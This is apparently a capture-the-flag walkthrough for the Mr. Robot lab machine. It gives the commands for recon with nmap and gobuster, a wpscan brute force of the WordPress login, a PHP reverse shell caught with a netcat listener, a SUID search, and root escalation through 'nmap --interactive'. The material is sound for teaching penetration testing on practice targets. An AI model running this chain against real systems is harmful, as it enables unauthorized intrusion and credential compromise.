Walkthorugh of Mr. Robot <br>
Youtube link for the walkthrough: https://www.youtube.com/watch?v=HJMV5SaWbF0 <br>

<br>
<br>
Discovering the IP address of the machine <br>
$ sudo arp-scan -l <br>
<br>
check the website <br>
http://10.0.2.5 <br>
you can also check the website tech stack with the help of wappalyzer
<br>
<br>
running an nmap scan <br>
$ sudo nmap -sC -sV -A 10.0.2.5 -o leavemehere.dat <br>
<br>
<br>
now scan the directory <br>
$ gobuster dir -u http://10.0.2.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <br>
with this you will get the wordpress login page <br>
copy the address <br>
http://10.0.2.5/wp-login.php <br>
check the username "elliot" <br>
<br>
<br>
also check the robots.txt file, here you will get two files <br>
one is the wordlist and other is the first key of this challenge <br>
you can download the files with 'wget' command <br>
also in the wordlist, some of the words are repeated here <br>
we will sort them and remove the duplicates <br>
$ cat fsociety.dic | sort | uniq > fs.dic <br>
lets now bruteforce the login with the wordlist <br>
$ wpscan --url http://10.0.2.5/wp-login.php --username elliot --passwords ./fs.dic <br>
with this you will get the password for the username <br>
<br>
<br>
now when you login the wordpress website you can use the PHP reverse shell script <br>
change the IP address to the kali IP address in the script <br>
now run the netcat <br>
$ nc -lnvp 1234 <br>
you will get the shell here <br>
check the id and the release version <br>
$ id <br>
$ lsb_release -a <br>
spawn the shell <br>
python -c "import pty; pty.spawn('/bin/bash')" <br>
<br>
<br>
in the robot directory you will get the password for the user 'robot' <br>
login with that credential and access the second key <br>
now to navigate to the root folder <br>
you have to escalate privilege <br>
$ find / -type f -perm -u=s 2>/dev/null <br>
you will find that you can use nmap <br>
you can use the nmap in an interactive mode to get the shell <br>
$ nmap --interactive <br>
nmap > !sh <br>
you will get te root shell now <br>
and then you can get the final key <br>
<br>
